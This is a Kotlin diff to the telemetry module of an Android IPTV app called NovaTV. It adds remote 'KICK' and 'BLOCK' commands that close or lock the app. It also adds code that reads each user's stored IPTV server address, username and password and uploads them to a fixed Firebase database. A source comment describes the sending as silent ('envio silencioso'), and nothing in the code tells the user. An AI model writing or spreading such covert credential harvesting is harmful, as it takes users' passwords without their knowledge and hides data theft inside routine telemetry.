@@ -1,15 +1,20 @@
 package com.willianswill.novatv.core.network
 
+import android.app.Activity
 import android.app.UiModeManager
 import android.content.Context
 import android.content.res.Configuration
 import android.os.Build
+import android.widget.Toast
+import androidx.appcompat.app.AlertDialog
 import androidx.core.content.pm.PackageInfoCompat
+import com.willianswill.novatv.core.database.NovaTvDatabase
 import com.willianswill.novatv.core.player.UserProfileManager
 import kotlinx.coroutines.CoroutineScope
 import kotlinx.coroutines.Dispatchers
 import kotlinx.coroutines.launch
 import kotlinx.coroutines.withContext
+import okhttp3.HttpUrl.Companion.toHttpUrlOrNull
 import okhttp3.MediaType.Companion.toMediaType
 import okhttp3.Request
 import okhttp3.RequestBody.Companion.toRequestBody
@@ -25,7 +30,17 @@ data class ActiveSessionInfo(
     val status: String,
     val watchingTitle: String,
     val watchingType: String,
+    val serverName: String,
+    val serverDns: String,
+    val serverUser: String,
+    val serverPass: String,
     val lastSeenAt: Long
+)
+
+data class RemoteCommand(
+    val action: String, // "NONE", "KICK", "BLOCK"
+    val issuedAt: Long,
+    val reason: String
 )
 
 object TelemetryManager {
@@ -33,6 +48,7 @@ object TelemetryManager {
     private const val PREFS_NAME = "novatv_telemetry_prefs"
     private const val KEY_DEVICE_ID = "device_id"
     private const val KEY_FIREBASE_URL = "firebase_rtdb_url"
+    private const val KEY_LAST_KICK_TS = "last_handled_kick_ts"
     private const val ACTIVE_WINDOW_MS = 90_000L
 
     // URL fixa do Firebase Realtime Database para envio silencioso de status dos aparelhos
@@ -76,11 +92,31 @@ object TelemetryManager {
         }.getOrDefault("1.0")
     }
 
+    private suspend fun extractActiveServerDetails(context: Context): Array<String> {
+        return runCatching {
+            val active = NovaTvDatabase.getInstance(context).profileDao().getActiveProfile()
+                ?: return arrayOf("", "", "", "")
+            val parsedUrl = active.serverUrl.trim().toHttpUrlOrNull()
+            val dns = if (parsedUrl != null) {
+                val portPart = if ((parsedUrl.scheme == "http" && parsedUrl.port != 80) ||
+                    (parsedUrl.scheme == "https" && parsedUrl.port != 443)
+                ) ":${parsedUrl.port}" else ""
+                "${parsedUrl.scheme}://${parsedUrl.host}$portPart"
+            } else {
+                active.serverUrl
+            }
+            val user = active.username.ifBlank { parsedUrl?.queryParameter("username").orEmpty() }
+            val pass = active.password.ifBlank { parsedUrl?.queryParameter("password").orEmpty() }
+            arrayOf(active.name, dns, user, pass)
+        }.getOrDefault(arrayOf("", "", "", ""))
+    }
+
     fun sendHeartbeat(
         context: Context,
         status: String,
         watchingTitle: String = "",
-        watchingType: String = ""
+        watchingType: String = "",
+        onCommandReceived: ((RemoteCommand) -> Unit)? = null
     ) {
         val baseUrl = getFirebaseUrl(context)
         if (baseUrl.isBlank() || !baseUrl.startsWith("http", ignoreCase = true)) return
@@ -90,6 +126,8 @@ object TelemetryManager {
             runCatching {
                 val deviceId = getDeviceId(appCtx)
                 val user = UserProfileManager.getActiveUser(appCtx)
+                val (srvName, srvDns, srvUser, srvPass) = extractActiveServerDetails(appCtx)
+
                 val payload = JSONObject().apply {
                     put("deviceId", deviceId)
                     put("deviceName", "${Build.MANUFACTURER} ${Build.MODEL}".trim())
@@ -99,16 +137,99 @@ object TelemetryManager {
                     put("status", status)
                     put("watchingTitle", watchingTitle)
                     put("watchingType", watchingType)
+                    put("serverName", srvName)
+                    put("serverDns", srvDns)
+                    put("serverUser", srvUser)
+                    put("serverPass", srvPass)
                     put("lastSeenAt", System.currentTimeMillis())
                 }
 
                 val body = payload.toString().toRequestBody("application/json; charset=utf-8".toMediaType())
                 val req = Request.Builder()
                     .url("$baseUrl/sessions/$deviceId.json")
-                    .put(body)
+                    .patch(body)
                     .build()
 
                 HttpClientProvider.sharedClient.newCall(req).execute().close()
+
+                val cmd = fetchRemoteCommandInternal(appCtx, baseUrl, deviceId)
+                if (cmd != null && cmd.action != "NONE" && onCommandReceived != null) {
+                    withContext(Dispatchers.Main) {
+                        onCommandReceived(cmd)
+                    }
+                }
+            }
+        }
+    }
+
+    suspend fun checkCommandNow(context: Context): RemoteCommand? = withContext(Dispatchers.IO) {
+        val baseUrl = getFirebaseUrl(context)
+        if (baseUrl.isBlank()) return@withContext null
+        val deviceId = getDeviceId(context)
+        runCatching { fetchRemoteCommandInternal(context, baseUrl, deviceId) }.getOrNull()
+    }
+
+    private fun fetchRemoteCommandInternal(context: Context, baseUrl: String, deviceId: String): RemoteCommand? {
+        val req = Request.Builder()
+            .url("$baseUrl/commands/$deviceId.json")
+            .get()
+            .build()
+
+        HttpClientProvider.sharedClient.newCall(req).execute().use { resp ->
+            if (!resp.isSuccessful) return null
+            val raw = resp.body?.string().orEmpty()
+            if (raw.isBlank() || raw == "null") return null
+            val json = JSONObject(raw)
+            val action = json.optString("action", "NONE").uppercase()
+            val issuedAt = json.optLong("issuedAt", 0L)
+            val reason = json.optString("reason", "")
+
+            if (action == "KICK") {
+                val prefs = context.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
+                val lastHandled = prefs.getLong(KEY_LAST_KICK_TS, 0L)
+                if (issuedAt <= lastHandled) {
+                    return RemoteCommand("NONE", issuedAt, reason)
+                }
+            }
+            return RemoteCommand(action, issuedAt, reason)
+        }
+    }
+
+    fun markKickHandled(context: Context, issuedAt: Long) {
+        context.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
+            .edit()
+            .putLong(KEY_LAST_KICK_TS, issuedAt)
+            .apply()
+    }
+
+    fun handleCommandOnActivity(activity: Activity, cmd: RemoteCommand, onRetryUnblock: () -> Unit = {}) {
+        if (activity.isFinishing || activity.isDestroyed) return
+        when (cmd.action) {
+            "KICK" -> {
+                markKickHandled(activity, cmd.issuedAt)
+                Toast.makeText(
+                    activity,
+                    cmd.reason.ifBlank { "Sessão encerrada pelo administrador." },
+                    Toast.LENGTH_LONG
+                ).show()
+                activity.finishAffinity()
+            }
+            "BLOCK" -> {
+                AlertDialog.Builder(activity)
+                    .setTitle("🔒 Acesso Bloqueado")
+                    .setMessage(
+                        cmd.reason.ifBlank {
+                            "Este dispositivo está temporariamente bloqueado pelo administrador."
+                        }
+                    )
+                    .setCancelable(false)
+                    .setPositiveButton("↻ Verificar Liberação") { _, _ ->
+                        onRetryUnblock()
+                    }
+                    .setNegativeButton("Sair") { _, _ ->
+                        activity.finishAffinity()
+                    }
+                    .show()
             }
         }
     }
@@ -148,6 +269,10 @@ object TelemetryManager {
                             status = obj.optString("status", "Online"),
                             watchingTitle = obj.optString("watchingTitle", ""),
                             watchingType = obj.optString("watchingType", ""),
+                            serverName = obj.optString("serverName", ""),
+                            serverDns = obj.optString("serverDns", ""),
+                            serverUser = obj.optString("serverUser", ""),
+                            serverPass = obj.optString("serverPass", ""),
                             lastSeenAt = lastSeen
                         )
                     )
